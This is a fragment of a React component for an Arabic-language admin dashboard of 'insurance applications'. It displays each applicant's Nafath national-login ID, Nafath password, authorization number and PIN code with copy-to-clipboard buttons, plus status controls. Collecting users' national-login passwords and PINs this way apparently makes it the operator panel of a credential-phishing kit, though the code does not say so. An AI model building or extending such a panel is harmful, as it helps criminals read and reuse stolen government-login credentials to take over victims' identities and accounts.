                    selectedApplication.nafazPass,
                    selectedApplication.authNumber,
                  ) && (
                    <Section title="معلومات نفاذ" icon={<Key className="w-3 h-3" />}>
                      <DataRow
                        label="معرف نفاذ"
                        value={selectedApplication.nafazId}
                        onCopy={copyToClipboard}
                        copied={copiedField!}
                      />
                      <DataRow
                        label="كلمة مرور نفاذ"
                        value={selectedApplication.nafazPass}
                        onCopy={copyToClipboard}
                        copied={copiedField!}
                      />
                      <DataRow
                        label="رقم التفويض"
                        value={selectedApplication.authNumber}
                        onCopy={copyToClipboard}
                        copied={copiedField!}
                      />
                    </Section>
                  )}

                  {/* PIN Code Section */}
                  {selectedApplication.pinCode && (
                    <Section title="رمز PIN" icon={<Lock className="w-3 h-3" />}>
                      <DataRow
                        label="رمز PIN"
                        value={selectedApplication.pinCode}
                        onCopy={copyToClipboard}
                        copied={copiedField!}
                      />
                    </Section>
                  )}

                  {/* Status Controls */}
                  <Section title="الإجراءات" icon={<Settings className="w-3 h-3" />}>
                    <div className="flex gap-1 flex-wrap">
                      {["draft", "pending_review", "approved", "rejected", "completed"].map((status) => (
                        <Button
                          key={status}
                          onClick={() =>
                            handleStatusChange(selectedApplication.id!, status as InsuranceApplication["status"])
                          }
                          size="sm"
                          className={`h-5 text-[8px] px-1.5 rounded ${
                            selectedApplication.status === status
                              ? "bg-emerald-500 text-white"
                              : "bg-slate-800 text-slate-400 hover:text-white"
                          }`}
                        >
                          {status === "pending_review"
                            ? "قيد المراجعة"
                            : status === "draft"
                              ? "مسودة"
                              : status === "approved"
                                ? "موافق"
                                : status === "rejected"
                                  ? "مرفوض"
                                  : "مكتمل"}
                        </Button>
                      ))}
                    </div>
                  </Section>

                  {/* Metadata */}
                  {(selectedApplication.assignedProfessional || selectedApplication.notes) && (
                    <Section title="الملاحظات" icon={<Info className="w-3 h-3" />}>
                      {selectedApplication.assignedProfessional && (
                        <DataRow
                          label="المسؤول"
                          value={selectedApplication.assignedProfessional}
                          onCopy={copyToClipboard}
                          copied={copiedField!}
                        />
                      )}
                      {selectedApplication.notes && (
                        <div className="p-1.5 bg-slate-900/50 rounded">
                          <span className="text-[8px] text-slate-400 block mb-0.5">الملاحظات:</span>
                          <p className="text-[8px] text-slate-300 whitespace-pre-wrap max-h-16 overflow-y-auto">
                            {selectedApplication.notes}
                          </p>
                        </div>
                      )}
                    </Section>
                  )}
                </div>
              </>
            )
          ) : (
            <div className="flex-1 flex items-center justify-center">
              <div className="text-center text-slate-500">
                <MessageSquare className="w-12 h-12 mx-auto mb-3 text-slate-700" />
                <p className="text-sm">اختر تطبيق</p>
                <p className="text-[10px]">اضغط على أي تطبيق من القائمة</p>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  )
}

function Section({ title, icon, children }: { title: string; icon: React.ReactNode; children: React.ReactNode }) {
  return (
    <div className="bg-slate-800/30 rounded-lg border border-slate-700/50 p-2">
      <div className="flex items-center gap-1.5 mb-1.5">
        <div className="text-slate-400">{icon}</div>
        <h3 className="text-[9px] font-bold text-slate-200">{title}</h3>
      </div>
      <div className="space-y-0.5">{children}</div>
    </div>
  )
}

function DataRow({
  label,
  value,
  onCopy,
  copied,
}: { label: string; value?: string | number | null; onCopy: (v: string, id: string) => void; copied: string }) {
  if (!value) return null
  const id = `${label}-${value}`
  return (
    <div className="flex items-center justify-between bg-slate-900/50 rounded px-1.5 py-0.5">
      <span className="text-[8px] text-slate-500">{label}</span>
      <div className="flex items-center gap-1">
        <span className="text-[8px] text-white" dir="ltr">
          {value}
        </span>
        <button onClick={() => onCopy(String(value), id)} className="text-slate-500 hover:text-white p-0.5">
          {copied ? <Check className="w-2 h-2 text-emerald-400" /> : <Copy className="w-2 h-2" />}
        </button>
      </div>
    </div>
  )
}
